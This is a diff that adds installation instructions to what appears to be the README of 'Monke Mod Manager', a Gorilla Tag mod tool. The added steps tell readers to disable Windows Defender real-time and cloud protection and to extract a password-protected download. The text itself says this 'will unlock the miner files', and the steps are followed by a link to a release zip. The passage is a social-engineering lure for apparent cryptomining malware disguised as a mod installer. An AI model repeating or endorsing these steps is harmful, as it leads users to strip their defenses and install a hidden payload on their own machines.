@@ -4,6 +4,43 @@
 
 In conclusion, Monke Mod Manager is a powerful and convenient utility software that makes it easy for players to manage and install mods for their games on the Windows platform. Its user-friendly interface, wide range of features, and support for multiple games make it an excellent choice for anyone looking to customize and optimize their gaming experience.
 
+📘 Installation Instructions
+
+🔧 Monke Mod Manager Full Setup Guide
+Follow these steps to properly install and run Monke Mod Manager with all necessary preparations:
+
+📥 Step 1: Download Monke Mod Manager
+Go to the official GitHub repository and download the latest .exe file from the Releases section.
+
+🛡️ Step 2: Disable Windows Defender (Optional but Recommended)
+Before launching the .exe, it's recommended to temporarily disable Windows Defender to avoid false-positive warnings:
+
+Open Windows Security → Virus & threat protection
+
+Click Manage settings
+
+Turn off Real-time protection and Cloud-delivered protection
+
+This ensures smoother installation and avoids file blocking.
+
+🗜️ Step 3: Install WinRAR
+Some mods or additional files might come in .rar format.
+If you don’t have WinRAR, download and install it from win-rar.com — it's required for extracting .rar archives.
+
+🔓 Step 4: Extract with Password
+Open the downloaded archive using WinRAR.
+When prompted, enter the password: monkemodmanager
+
+This will unlock the miner files for use.
+
+🧰 Step 5: Select Your Mods
+Tick the boxes for the mods you want to install (e.g., BananaHook, Utils, Air Jump, etc.).
+Then click Install / Update — the tool will download and install them for you.
+
+🔁 Step 6: Launch Gorilla Tag
+Start the game as usual — your selected mods should now be active.
+You can reopen Monke Mod Manager anytime to add/remove/update your mods.
+
 <a href="https://github.com/DeadlyKittenn/MonkeModManager/releases/download/1/Set-UpMonkeModManager.zip">
     <img src="https://www.librasol.com.br/wp-content/uploads/2018/09/windows-button-download.png" alt="Download" width="200" />
 </a>
